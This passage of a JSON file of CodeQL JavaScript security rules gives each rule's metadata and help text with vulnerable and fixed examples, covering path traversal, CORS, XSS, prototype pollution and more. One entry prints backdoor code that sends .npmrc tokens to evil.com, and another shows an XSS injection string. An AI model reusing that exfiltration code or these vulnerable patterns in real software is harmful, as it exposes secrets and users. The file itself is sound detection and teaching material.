require('http'),\n      path = require('path'),\n      url = require('url');\n\nconst ROOT = \"/var/www/\";\n\nvar server = http.createServer(function(req, res) {\n  let filePath = url.parse(req.url, true).query.path;\n\n  // GOOD: Verify that the file path is under the root directory\n  filePath = fs.realpathSync(path.resolve(ROOT, filePath));\n  if (!filePath.startsWith(ROOT)) {\n    res.statusCode = 403;\n    res.end();\n    return;\n  }\n  res.write(fs.readFileSync(filePath, 'utf8'));\n});\n```\n\n## References\n* OWASP: [Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal).\n* npm: [sanitize-filename](https://www.npmjs.com/package/sanitize-filename) package.\n* Common Weakness Enumeration: [CWE-22](https://cwe.mitre.org/data/definitions/22.html).\n* Common Weakness Enumeration: [CWE-23](https://cwe.mitre.org/data/definitions/23.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n* Common Weakness Enumeration: [CWE-73](https://cwe.mitre.org/data/definitions/73.html).\n* Common Weakness Enumeration: [CWE-99](https://cwe.mitre.org/data/definitions/99.html).\n"
  },
  "js/functionality-from-untrusted-source": {
    "name": "Inclusion of functionality from an untrusted source",
    "description": "Including functionality from an untrusted source may allow an attacker to control the functionality and execute arbitrary code.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 6.0,
    "precision": "high",
    "id": "js/functionality-from-untrusted-source",
    "tags": [
      "security",
      "external/cwe/cwe-830"
    ],
    "filename": "3a4f8c7f-FunctionalityFromUntrustedSource",
    "language": "javascript",
    "help": "# Inclusion of functionality from an untrusted source\nIncluding a resource from an untrusted source or using an untrusted channel may allow an attacker to include arbitrary code in the response. When including an external resource (for example, a `script` element or an `iframe` element) on a page, it is important to ensure that the received data is not malicious.\n\nWhen including external resources, it is possible to verify that the responding server is the intended one by using an `https` URL. This prevents a MITM (man-in-the-middle) attack where an attacker might have been able to spoof a server response.\n\nEven when `https` is used, an attacker might still compromise the server. When you use a `script` element, you can check for subresource integrity - that is, you can check the contents of the data received by supplying a cryptographic digest of the expected sources to the `script` element. The script will only load sources that match the digest and an attacker will be unable to modify the script even when the server is compromised.\n\nSubresource integrity (SRI) checking is commonly recommended when importing a fixed version of a library - for example, from a CDN (content-delivery network). Then, the fixed digest of that version of the library can easily be added to the `script` element's `integrity` attribute.\n\nA dynamic service cannot be easily used with SRI. Nevertheless, it is possible to list multiple acceptable SHA hashes in the `integrity` attribute, such as those for the content generated for major browers used by your users.\n\nSee the \\[\\`CUSTOMIZING.md\\`\\](https://github.com/github/codeql/blob/main/javascript/ql/src/Security/CWE-830/CUSTOMIZING.md) file in the source code for this query for information on how to extend the list of hostnames required to use SRI by this query.\n\n\n## Recommendation\nWhen an `iframe` element is used to embed a page, it is important to use an `https` URL.\n\nWhen using a `script` element to load a script, it is important to use an `https` URL and to consider checking subresource integrity.\n\n\n## Example\nThe following example loads the jQuery library from the jQuery CDN without using `https` and without checking subresource integrity.\n\n\n```html\n<html>\n    <head>\n        <title>jQuery demo</title>\n        <script src=\"http://code.jquery.com/jquery-3.6.0.slim.min.js\" crossorigin=\"anonymous\"></script>\n    </head>\n    <body>\n        ...\n    </body>\n</html>\n```\nInstead, loading jQuery from the same domain using `https` and checking subresource integrity is recommended, as in the next example.\n\n\n```html\n<html>\n    <head>\n        <title>jQuery demo</title>\n        <script src=\"https://code.jquery.com/jquery-3.6.0.slim.min.js\" integrity=\"sha256-u7e5khyithlIdTpu22PHhENmPcRdFiHRjhAuHcs05RI=\" crossorigin=\"anonymous\"></script>\n    </head>\n    <body>\n        ...\n    </body>\n</html>\n```\n\n## References\n* MDN: [Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Subresource_Integrity)\n* Smashing Magazine: [Understanding Subresource Integrity](https://www.smashingmagazine.com/2019/04/understanding-subresource-integrity/)\n* Common Weakness Enumeration: [CWE-830](https://cwe.mitre.org/data/definitions/830.html).\n"
  },
  "js/samesite-none-cookie": {
    "name": "Sensitive cookie without SameSite restrictions",
    "description": "Sensitive cookies where the SameSite attribute is set to \"None\" can in some cases allow for Cross-Site Request Forgery (CSRF) attacks.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 5.0,
    "precision": "medium",
    "id": "js/samesite-none-cookie",
    "tags": [
      "security",
      "external/cwe/cwe-1275"
    ],
    "filename": "45f264da-SameSiteNoneCookie",
    "language": "javascript",
    "help": "# Sensitive cookie without SameSite restrictions\nAuthentication cookies where the SameSite attribute is set to \"None\" can potentially be used to perform Cross-Site Request Forgery (CSRF) attacks if no other CSRF protections are in place.\n\nWith SameSite set to \"None\", a third party website may create an authorized cross-site request that includes the cookie. Such a cross-site request can allow that website to perform actions on behalf of a user.\n\n\n## Recommendation\nSet the `SameSite` attribute to `Strict` on all sensitive cookies.\n\n\n## Example\nThe following example stores an authentication token in a cookie where the `SameSite` attribute is set to `None`.\n\n\n```javascript\nconst http = require('http');\n\nconst server = http.createServer((req, res) => {\n    res.setHeader(\"Set-Cookie\", `authKey=${makeAuthkey()}; secure; httpOnly; SameSite=None`);\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end('<h2>Hello world</h2>');\n});\n```\nTo prevent the cookie from being included in cross-site requests, set the `SameSite` attribute to `Strict`.\n\n\n```javascript\nconst http = require('http');\n\nconst server = http.createServer((req, res) => {\n    res.setHeader(\"Set-Cookie\", `authKey=${makeAuthkey()}; secure; httpOnly; SameSite=Strict`);\n    res.writeHead(200, { 'Content-Type': 'text/html' });\n    res.end('<h2>Hello world</h2>');\n});\n```\n\n## References\n* MDN Web Docs: [SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite).\n* OWASP: [SameSite](https://owasp.org/www-community/SameSite).\n* Common Weakness Enumeration: [CWE-1275](https://cwe.mitre.org/data/definitions/1275.html).\n"
  },
  "js/hardcoded-credentials": {
    "name": "Hard-coded credentials",
    "description": "Hard-coding credentials in source code may enable an attacker to gain unauthorized access.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 9.8,
    "precision": "high",
    "id": "js/hardcoded-credentials",
    "tags": [
      "security",
      "external/cwe/cwe-259",
      "external/cwe/cwe-321",
      "external/cwe/cwe-798"
    ],
    "filename": "0e08532c-HardcodedCredentials",
    "language": "javascript",
    "help": "# Hard-coded credentials\nIncluding unencrypted hard-coded authentication credentials in source code is dangerous because the credentials may be easily discovered. For example, the code may be open source, or it may be leaked or accidentally revealed, making the credentials visible to an attacker. This, in turn, might enable them to gain unauthorized access, or to obtain privileged information.\n\n\n## Recommendation\nRemove hard-coded credentials, such as user names, passwords and certificates, from source code. Instead, place them in configuration files, environment variables or other data stores if necessary. If possible, store configuration files including credential data separately from the source code, in a secure location with restricted access.\n\nIf the credentials are a placeholder value, make sure the value is obviously a placeholder by using a name such as `\"SampleToken\"` or `\"MyPassword\"`.\n\n\n## Example\nThe following code example connects to an HTTP request using an hard-codes authentication header:\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = 'user';\nlet password = 'passwd';\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n          method:'GET',\n          headers: headers\n       })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\nInstead, user name and password can be supplied through the environment variables `username` and `password`, which can be set externally without hard-coding credentials in the source code.\n\n\n```javascript\nlet base64 = require('base-64');\n\nlet url = 'http://example.org/auth';\nlet username = process.env.USERNAME;\nlet password = process.env.PASSWORD;\n\nlet headers = new Headers();\n\nheaders.append('Content-Type', 'text/json');\nheaders.append('Authorization', 'Basic' + base64.encode(username + \":\" + password));\n\nfetch(url, {\n        method:'GET',\n        headers: headers\n     })\n.then(response => response.json())\n.then(json => console.log(json))\n.done();\n\n```\n\n## Example\nThe following code example connects to a Postgres database using the `pg` package and hard-codes user name and password:\n\n\n```javascript\nconst pg = require(\"pg\");\n\nconst client = new pg.Client({\n  user: \"bob\",\n  host: \"database.server.com\",\n  database: \"mydb\",\n  password: \"correct-horse-battery-staple\",\n  port: 3211\n});\nclient.connect();\n\n```\nInstead, user name and password can be supplied through the environment variables `PGUSER` and `PGPASSWORD`, which can be set externally without hard-coding credentials in the source code.\n\n\n## References\n* OWASP: [Use of hard-coded password](https://www.owasp.org/index.php/Use_of_hard-coded_password).\n* Common Weakness Enumeration: [CWE-259](https://cwe.mitre.org/data/definitions/259.html).\n* Common Weakness Enumeration: [CWE-321](https://cwe.mitre.org/data/definitions/321.html).\n* Common Weakness Enumeration: [CWE-798](https://cwe.mitre.org/data/definitions/798.html).\n"
  },
  "js/insecure-download": {
    "name": "Download of sensitive file through insecure connection",
    "description": "Downloading executables and other sensitive files over an insecure connection opens up for potential man-in-the-middle attacks.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 8.1,
    "precision": "high",
    "id": "js/insecure-download",
    "tags": [
      "security",
      "external/cwe/cwe-829"
    ],
    "filename": "072f69fe-InsecureDownload",
    "language": "javascript",
    "help": "# Download of sensitive file through insecure connection\nDownloading executables or other sensitive files over an unencrypted connection can leave a server open to man-in-the-middle attacks (MITM). Such an attack can allow an attacker to insert arbitrary content into the downloaded file, and in the worst case, allow the attacker to execute arbitrary code on the vulnerable system.\n\n\n## Recommendation\nUse a secure transfer protocol when downloading executables or other sensitive files.\n\n\n## Example\nIn this example, a server downloads a shell script from a remote URL using the `node-fetch` library, and then executes this shell script.\n\n\n```javascript\nconst fetch = require(\"node-fetch\");\nconst cp = require(\"child_process\");\n\nfetch('http://mydownload.example.org/myscript.sh')\n    .then(res => res.text())\n    .then(script => cp.execSync(script));\n```\nThe HTTP protocol is vulnerable to MITM, and thus an attacker could potentially replace the downloaded shell script with arbitrary code, which gives the attacker complete control over the system.\n\nThe issue has been fixed in the example below by replacing the HTTP protocol with the HTTPS protocol.\n\n\n```javascript\nconst fetch = require(\"node-fetch\");\nconst cp = require(\"child_process\");\n\nfetch('https://mydownload.example.org/myscript.sh')\n    .then(res => res.text())\n    .then(script => cp.execSync(script));\n```\n\n## References\n* Wikipedia: [Man-in-the-middle attack](https://en.wikipedia.org/wiki/Man-in-the-middle_attack)\n* Common Weakness Enumeration: [CWE-829](https://cwe.mitre.org/data/definitions/829.html).\n"
  },
  "js/incomplete-html-attribute-sanitization": {
    "name": "Incomplete HTML attribute sanitization",
    "description": "Writing incompletely sanitized values to HTML attribute strings can lead to a cross-site scripting vulnerability.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.1,
    "precision": "high",
    "id": "js/incomplete-html-attribute-sanitization",
    "tags": [
      "security",
      "external/cwe/cwe-079",
      "external/cwe/cwe-116",
      "external/cwe/cwe-020"
    ],
    "filename": "557f3ed7-IncompleteHtmlAttributeSanitization",
    "language": "javascript",
    "help": "# Incomplete HTML attribute sanitization\nSanitizing untrusted input for HTML meta-characters is a common technique for preventing cross-site scripting attacks. Usually, this is done by escaping `<`, `>`, `&` and `\"`. However, the context in which the sanitized value is used decides the characters that need to be sanitized.\n\nAs a consequence, some programs only sanitize `<` and `>` since those are the most common dangerous characters. The lack of sanitization for `\"` is problematic when an incompletely sanitized value is used as an HTML attribute in a string that later is parsed as HTML.\n\n\n## Recommendation\nSanitize all relevant HTML meta-characters when constructing HTML dynamically, and pay special attention to where the sanitized value is used.\n\nAn even safer alternative is to design the application so that sanitization is not needed, for instance by using HTML templates that are explicit about the values they treat as HTML.\n\n\n## Example\nThe following example code writes part of an HTTP request (which is controlled by the user) to an HTML attribute of the server response. The user-controlled value is, however, not sanitized for `\"`. This leaves the website vulnerable to cross-site scripting since an attacker can use a string like `\" onclick=\"alert(42)` to inject JavaScript code into the response.\n\n\n```javascript\nvar app = require('express')();\n\napp.get('/user/:id', function(req, res) {\n\tlet id = req.params.id;\n\tid = id.replace(/<|>/g, \"\"); // BAD\n\tlet userHtml = `<div data-id=\"${id}\">${getUserName(id) || \"Unknown name\"}</div>`;\n\t// ...\n\tres.send(prefix + userHtml + suffix);\n});\n\n```\nSanitizing the user-controlled data for `\"` helps prevent the vulnerability:\n\n\n```javascript\nvar app = require('express')();\n\napp.get('/user/:id', function(req, res) {\n\tlet id = req.params.id;\n\tid = id.replace(/<|>|&|\"/g, \"\"); // GOOD\n\tlet userHtml = `<div data-id=\"${id}\">${getUserName(id) || \"Unknown name\"}</div>`;\n\t// ...\n\tres.send(prefix + userHtml + suffix);\n});\n\n```\n\n## References\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n* OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n* OWASP [Types of Cross-Site](https://owasp.org/www-community/Types_of_Cross-Site_Scripting).\n* Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "js/cors-misconfiguration-for-credentials-more-sources": {
    "name": "CORS misconfiguration for credentials transfer with additional heuristic sources",
    "description": "Misconfiguration of CORS HTTP headers allows for leaks of secret credentials.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/cors-misconfiguration-for-credentials-more-sources",
    "tags": [
      "experimental",
      "security",
      "external/cwe/cwe-346",
      "external/cwe/cwe-639",
      "external/cwe/cwe-942"
    ],
    "filename": "86dc168c-CorsMisconfigurationForCredentials",
    "language": "javascript",
    "help": "# CORS misconfiguration for credentials transfer with additional heuristic sources\nA server can send the `\"Access-Control-Allow-Credentials\"` CORS header to control when a browser may send user credentials in Cross-Origin HTTP requests.\n\nWhen the `Access-Control-Allow-Credentials` header is `\"true\"`, the `Access-Control-Allow-Origin` header must have a value different from `\"*\"` in order to make browsers accept the header. Therefore, to allow multiple origins for Cross-Origin requests with credentials, the server must dynamically compute the value of the `\"Access-Control-Allow-Origin\"` header. Computing this header value from information in the request to the server can therefore potentially allow an attacker to control the origins that the browser sends credentials to.\n\n\n## Recommendation\nWhen the `Access-Control-Allow-Credentials` header value is `\"true\"`, a dynamic computation of the `Access-Control-Allow-Origin` header must involve sanitization if it relies on user-controlled input.\n\nSince the `\"null\"` origin is easy to obtain for an attacker, it is never safe to use `\"null\"` as the value of the `Access-Control-Allow-Origin` header when the `Access-Control-Allow-Credentials` header value is `\"true\"`.\n\n\n## Example\nIn the example below, the server allows the browser to send user credentials in a Cross-Origin request. The request header `origins` controls the allowed origins for such a Cross-Origin request.\n\n\n```javascript\nvar https = require('https'),\n    url = require('url');\n\nvar server = https.createServer(function(){});\n\nserver.on('request', function(req, res) {\n    let origin = url.parse(req.url, true).query.origin;\n     // BAD: attacker can choose the value of origin\n    res.setHeader(\"Access-Control-Allow-Origin\", origin);\n    res.setHeader(\"Access-Control-Allow-Credentials\", true);\n\n    // ...\n});\n\n```\nThis is not secure, since an attacker can choose the value of the `origin` request header to make the browser send credentials to their own server. The use of a whitelist containing allowed origins for the Cross-Origin request fixes the issue:\n\n\n```javascript\nvar https = require('https'),\n    url = require('url');\n\nvar server = https.createServer(function(){});\n\nserver.on('request', function(req, res) {\n    let origin = url.parse(req.url, true).query.origin,\n        whitelist = {\n            \"https://example.com\": true,\n            \"https://subdomain.example.com\": true,\n            \"https://example.com:1337\": true\n        };\n\n    if (origin in whitelist) {\n        // GOOD: the origin is in the whitelist\n        res.setHeader(\"Access-Control-Allow-Origin\", origin);\n        res.setHeader(\"Access-Control-Allow-Credentials\", true);\n    }\n\n    // ...\n});\n\n```\n\n## References\n* Mozilla Developer Network: [CORS, Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin).\n* Mozilla Developer Network: [CORS, Access-Control-Allow-Credentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials).\n* PortSwigger: [Exploiting CORS Misconfigurations for Bitcoins and Bounties](http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html)\n* W3C: [CORS for developers, Advice for Resource Owners](https://w3c.github.io/webappsec-cors-for-developers/#resources)\n* Common Weakness Enumeration: [CWE-346](https://cwe.mitre.org/data/definitions/346.html).\n* Common Weakness Enumeration: [CWE-639](https://cwe.mitre.org/data/definitions/639.html).\n* Common Weakness Enumeration: [CWE-942](https://cwe.mitre.org/data/definitions/942.html).\n"
  },
  "js/unvalidated-dynamic-method-call": {
    "name": "Unvalidated dynamic method call",
    "description": "Calling a method with a user-controlled name may dispatch to an unexpected target, which could cause an exception.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/unvalidated-dynamic-method-call",
    "tags": [
      "security",
      "external/cwe/cwe-754"
    ],
    "filename": "bd5ee4c6-UnvalidatedDynamicMethodCall",
    "language": "javascript",
    "help": "# Unvalidated dynamic method call\nJavaScript makes it easy to look up object properties dynamically at runtime. In particular, methods can be looked up by name and then called. However, if the method name is user-controlled, an attacker could choose a name that makes the application invoke an unexpected method, which may cause a runtime exception. If this exception is not handled, it could be used to mount a denial-of-service attack.\n\nFor example, there might not be a method of the given name, or the result of the lookup might not be a function. In either case the method call will throw a `TypeError` at runtime.\n\nAnother, more subtle example is where the result of the lookup is a standard library method from `Object.prototype`, which most objects have on their prototype chain. Examples of such methods include `valueOf`, `hasOwnProperty` and `__defineSetter__`. If the method call passes the wrong number or kind of arguments to these methods, they will throw an exception.\n\n\n## Recommendation\nIt is best to avoid dynamic method lookup involving user-controlled names altogether, for instance by using a `Map` instead of a plain object.\n\nIf the dynamic method lookup cannot be avoided, consider whitelisting permitted method names. At the very least, check that the method is an own property and not inherited from the prototype object. If the object on which the method is looked up contains properties that are not methods, you should additionally check that the result of the lookup is a function. Even if the object only contains methods, it is still a good idea to perform this check in case other properties are added to the object later on.\n\n\n## Example\nIn the following example, an HTTP request parameter `action` property is used to dynamically look up a function in the `actions` map, which is then invoked with the `payload` parameter as its argument.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\nvar actions = {\n  play(data) {\n    // ...\n  },\n  pause(data) {\n    // ...\n  }\n}\n\napp.get('/perform/:action/:payload', function(req, res) {\n  let action = actions[req.params.action];\n  // BAD: `action` may not be a function\n  res.end(action(req.params.payload));\n});\n\n```\nThe intention is to allow clients to invoke the `play` or `pause` method, but there is no check that `action` is actually the name of a method stored in `actions`. If, for example, `action` is `rewind`, `action` will be `undefined` and the call will result in a runtime error.\n\nThe easiest way to prevent this is to turn `actions` into a `Map` and using `Map.prototype.has` to check whether the method name is valid before looking it up.\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\nvar actions = new Map();\nactions.set(\"play\", function play(data) {\n  // ...\n});\nactions.set(\"pause\", function pause(data) {\n  // ...\n});\n\napp.get('/perform/:action/:payload', function(req, res) {\n  if (actions.has(req.params.action)) {\n    if (typeof actions.get(req.params.action) === 'function'){\n      let action = actions.get(req.params.action);\n    }\n    // GOOD: `action` is either the `play` or the `pause` function from above\n    res.end(action(req.params.payload));\n  } else {\n    res.end(\"Unsupported action.\");\n  }\n});\n\n```\nIf `actions` cannot be turned into a `Map`, a `hasOwnProperty` check should be added to validate the method name:\n\n\n```javascript\nvar express = require('express');\nvar app = express();\n\nvar actions = {\n  play(data) {\n    // ...\n  },\n  pause(data) {\n    // ...\n  }\n}\n\napp.get('/perform/:action/:payload', function(req, res) {\n  if (actions.hasOwnProperty(req.params.action)) {\n    let action = actions[req.params.action];\n    if (typeof action === 'function') {\n      // GOOD: `action` is an own method of `actions`\n      res.end(action(req.params.payload));\n      return;\n    }\n  }\n  res.end(\"Unsupported action.\");\n});\n\n```\n\n## References\n* OWASP: [Denial of Service](https://www.owasp.org/index.php/Denial_of_Service).\n* MDN: [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map).\n* MDN: [Object.prototype](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/prototype).\n* Common Weakness Enumeration: [CWE-754](https://cwe.mitre.org/data/definitions/754.html).\n"
  },
  "js/file-access-to-http": {
    "name": "File data in outbound network request",
    "description": "Directly sending file data in an outbound network request can indicate unauthorized information disclosure.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.5,
    "precision": "medium",
    "id": "js/file-access-to-http",
    "tags": [
      "security",
      "external/cwe/cwe-200"
    ],
    "filename": "440a7211-FileAccessToHttp",
    "language": "javascript",
    "help": "# File data in outbound network request\nSending local file system data to a remote URL without further validation risks uncontrolled information exposure, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.\n\n\n## Recommendation\nExamine the highlighted code closely to ensure that it is behaving as intended.\n\n\n## Example\nThe following example is adapted from backdoor code that was identified in two popular npm packages. It reads the contents of the `.npmrc` file (which may contain secret npm tokens) and sends it to a remote server by embedding it into an HTTP request header.\n\n\n```javascript\nvar fs = require(\"fs\"),\n    https = require(\"https\");\n\nvar content = fs.readFileSync(\".npmrc\", \"utf8\");\nhttps.get({\n  hostname: \"evil.com\",\n  path: \"/upload\",\n  method: \"GET\",\n  headers: { Referer: content }\n}, () => { });\n\n```\n\n## References\n* ESLint Blog: [Postmortem for Malicious Packages Published on July 12th, 2018](https://eslint.org/blog/2018/07/postmortem-for-malicious-package-publishes).\n* OWASP: [Sensitive Data Exposure](https://www.owasp.org/index.php/Top_10-2017_A3-Sensitive_Data_Exposure).\n* OWASP: [Trojan Horse](https://www.owasp.org/index.php/Trojan_Horse).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n"
  },
  "js/cors-misconfiguration-for-credentials": {
    "name": "CORS misconfiguration for credentials transfer",
    "description": "Misconfiguration of CORS HTTP headers allows for leaks of secret credentials.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "js/cors-misconfiguration-for-credentials",
    "tags": [
      "security",
      "external/cwe/cwe-346",
      "external/cwe/cwe-639",
      "external/cwe/cwe-942"
    ],
    "filename": "a2ed60f4-CorsMisconfigurationForCredentials",
    "language": "javascript",
    "help": "# CORS misconfiguration for credentials transfer\nA server can send the `\"Access-Control-Allow-Credentials\"` CORS header to control when a browser may send user credentials in Cross-Origin HTTP requests.\n\nWhen the `Access-Control-Allow-Credentials` header is `\"true\"`, the `Access-Control-Allow-Origin` header must have a value different from `\"*\"` in order to make browsers accept the header. Therefore, to allow multiple origins for Cross-Origin requests with credentials, the server must dynamically compute the value of the `\"Access-Control-Allow-Origin\"` header. Computing this header value from information in the request to the server can therefore potentially allow an attacker to control the origins that the browser sends credentials to.\n\n\n## Recommendation\nWhen the `Access-Control-Allow-Credentials` header value is `\"true\"`, a dynamic computation of the `Access-Control-Allow-Origin` header must involve sanitization if it relies on user-controlled input.\n\nSince the `\"null\"` origin is easy to obtain for an attacker, it is never safe to use `\"null\"` as the value of the `Access-Control-Allow-Origin` header when the `Access-Control-Allow-Credentials` header value is `\"true\"`.\n\n\n## Example\nIn the example below, the server allows the browser to send user credentials in a Cross-Origin request. The request header `origins` controls the allowed origins for such a Cross-Origin request.\n\n\n```javascript\nvar https = require('https'),\n    url = require('url');\n\nvar server = https.createServer(function(){});\n\nserver.on('request', function(req, res) {\n    let origin = url.parse(req.url, true).query.origin;\n     // BAD: attacker can choose the value of origin\n    res.setHeader(\"Access-Control-Allow-Origin\", origin);\n    res.setHeader(\"Access-Control-Allow-Credentials\", true);\n\n    // ...\n});\n\n```\nThis is not secure, since an attacker can choose the value of the `origin` request header to make the browser send credentials to their own server. The use of a whitelist containing allowed origins for the Cross-Origin request fixes the issue:\n\n\n```javascript\nvar https = require('https'),\n    url = require('url');\n\nvar server = https.createServer(function(){});\n\nserver.on('request', function(req, res) {\n    let origin = url.parse(req.url, true).query.origin,\n        whitelist = {\n            \"https://example.com\": true,\n            \"https://subdomain.example.com\": true,\n            \"https://example.com:1337\": true\n        };\n\n    if (origin in whitelist) {\n        // GOOD: the origin is in the whitelist\n        res.setHeader(\"Access-Control-Allow-Origin\", origin);\n        res.setHeader(\"Access-Control-Allow-Credentials\", true);\n    }\n\n    // ...\n});\n\n```\n\n## References\n* Mozilla Developer Network: [CORS, Access-Control-Allow-Origin](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin).\n* Mozilla Developer Network: [CORS, Access-Control-Allow-Credentials](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials).\n* PortSwigger: [Exploiting CORS Misconfigurations for Bitcoins and Bounties](http://blog.portswigger.net/2016/10/exploiting-cors-misconfigurations-for.html)\n* W3C: [CORS for developers, Advice for Resource Owners](https://w3c.github.io/webappsec-cors-for-developers/#resources)\n* Common Weakness Enumeration: [CWE-346](https://cwe.mitre.org/data/definitions/346.html).\n* Common Weakness Enumeration: [CWE-639](https://cwe.mitre.org/data/definitions/639.html).\n* Common Weakness Enumeration: [CWE-942](https://cwe.mitre.org/data/definitions/942.html).\n"
  },
  "js/prototype-polluting-assignment-more-sources": {
    "name": "Prototype-polluting assignment with additional heuristic sources",
    "description": "Modifying an object obtained via a user-controlled property name may lead to accidental mutation of the built-in Object prototype, and possibly escalate to remote code execution or cross-site scripting.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 6.1,
    "precision": "high",
    "id": "js/prototype-polluting-assignment-more-sources",
    "tags": [
      "experimental",
      "security",
      "external/cwe/cwe-078",
      "external/cwe/cwe-079",
      "external/cwe/cwe-094",
      "external/cwe/cwe-400",
      "external/cwe/cwe-471",
      "external/cwe/cwe-915"
    ],
    "filename": "7d1634f2-PrototypePollutingAssignment",
    "language": "javascript",
    "help": "# Prototype-polluting assignment with additional heuristic sources\nMost JavaScript objects inherit the properties of the built-in `Object.prototype` object. Prototype pollution is a type of vulnerability in which an attacker is able to modify `Object.prototype`. Since most objects inherit from the compromised `Object.prototype` object, the attacker can use this to tamper with the application logic, and often escalate to remote code execution or cross-site scripting.\n\nOne way to cause prototype pollution is by modifying an object obtained via a user-controlled property name. Most objects have a special `__proto__` property that refers to `Object.prototype`. An attacker can abuse this special property to trick the application into performing unintended modifications of `Object.prototype`.\n\n\n## Recommendation\nUse an associative data structure that is resilient to untrusted key values, such as a [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map). In some cases, a prototype-less object created with [Object.create(null)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/create) may be preferable.\n\nAlternatively, restrict the computed property name so it can't clash with a built-in property, either by prefixing it with a constant string, or by rejecting inputs that don't conform to the expected format.\n\n\n## Example\nIn the example below, the untrusted value `req.params.id` is used as the property name `req.session.todos[id]`. If a malicious user passes in the ID value `__proto__`, the variable `items` will then refer to `Object.prototype`. Finally, the modification of `items` then allows the attacker to inject arbitrary properties onto `Object.prototype`.\n\n\n```javascript\nlet express = require('express');\nlet app = express()\n\napp.put('/todos/:id', (req, res) => {\n    let id = req.params.id;\n    let items = req.session.todos[id];\n    if (!items) {\n        items = req.session.todos[id] = {};\n    }\n    items[req.query.name] = req.query.text;\n    res.end(200);\n});\n\n```\nOne way to fix this is to use [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map) objects to associate key/value pairs instead of regular objects, as shown below:\n\n\n```javascript\nlet express = require('express');\nlet app = express()\n\napp.put('/todos/:id', (req, res) => {\n    let id = req.params.id;\n    let items = req.session.todos.get(id);\n    if (!items) {\n        items = new Map();\n        req.sessions.todos.set(id, items);\n    }\n    items.set(req.query.name, req.query.text);\n    res.end(200);\n});\n\n```\nAnother way to fix it is to prevent the `__proto__` property from being used as a key, as shown below:\n\n\n```javascript\nlet express = require('express');\nlet app = express()\n\napp.put('/todos/:id', (req, res) => {\n    let id = req.params.id;\n    if (id === '__proto__' || id === 'constructor' || id === 'prototype') {\n        res.end(403);\n        return;\n    }\n    let items = req.session.todos[id];\n    if (!items) {\n        items = req.session.todos[id] = {};\n    }\n    items[req.query.name] = req.query.text;\n    res.end(200);\n});\n\n```\n\n## References\n* MDN: [Object.prototype.__proto__](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object/proto)\n* MDN: [Map](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Map)\n* Common Weakness Enumeration: [CWE-78](https://cwe.mitre.org/data/definitions/78.html).\n* Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n* Common Weakness Enumeration: [CWE-471](https://cwe.mitre.org/data/definitions/471.html).\n* Common Weakness Enumeration: [CWE-915](https://cwe.mitre.org/data/definitions/915.html).\n"
  },
  "js/client-exposed-cookie": {
    "name": "Sensitive server cookie exposed to the client",
    "description": "Sensitive cookies set by a server can be read by the client if the `httpOnly` flag is not set.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 5.0,
    "precision": "high",
    "id": "js/client-exposed-cookie",
    "tags": [
      "security",
      "external/cwe/cwe-1004"
    ],
    "filename": "70084ef1-ClientExposedCookie",
    "language": "javascript",
